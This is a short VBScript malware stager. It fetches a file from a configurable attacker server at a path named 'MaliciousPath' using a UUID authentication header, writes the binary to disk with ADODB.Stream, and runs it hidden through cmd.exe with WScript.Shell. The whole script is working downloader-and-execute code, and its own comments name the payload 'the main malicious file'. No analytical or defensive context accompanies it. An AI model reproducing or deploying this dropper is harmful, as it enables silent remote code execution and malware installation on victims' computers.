Public SERVERADDRESS
SERVERADDRESS = "http://IPorDNS"
Public CONFIGURATIONPATH
CONFIGURATIONPATH = "/Configuration"
Public HEADERS
HEADERS = "UUID-01" ' Server authentication
Public COMMANDSTOEXE
Public MALICIOUSURL
MALICIOUSURL = "/MaliciousPath" ' To get the main malicious file
Public HttpGetRequestVar
Public DownloadFileFromServerVar

'=====Download the main malicious file and store it:=====
Dim http
Set http = CreateObject("Msxml2.ServerXMLHTTP")
http.Open "GET", SERVERADDRESS+MALICIOUSURL , False
http.setRequestHeader "UUID",HEADERS
'http.setProxy 2, "127.0.0.1:8080", ""
http.send
Dim response(2)
If http.Status = 200 Then
	response(0) = http.getResponseHeader("Filename")
	response(1) = http.responseBody
End If
HttpGetRequestVar = response

Dim FileName,BinaryCodeToExe
FileName = HttpGetRequestVar(0)
BinaryCodeToExe = HttpGetRequestVar(1)
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2

'Create Stream object
Dim BinaryStream
Set BinaryStream = CreateObject("ADODB.Stream")

'Specify stream type - we want To save binary data.
BinaryStream.Type = adTypeBinary

'Open the stream And write binary data To the object
BinaryStream.Open
BinaryStream.Write BinaryCodeToExe

'Save binary data To disk
BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
DownloadFileFromServerVar = FileName

'=====Run the main malicious file:=====
Set oShell = CreateObject ("WScript.Shell")
oShell.Run "%comspec% /c " & DownloadFileFromServerVar, 0, True
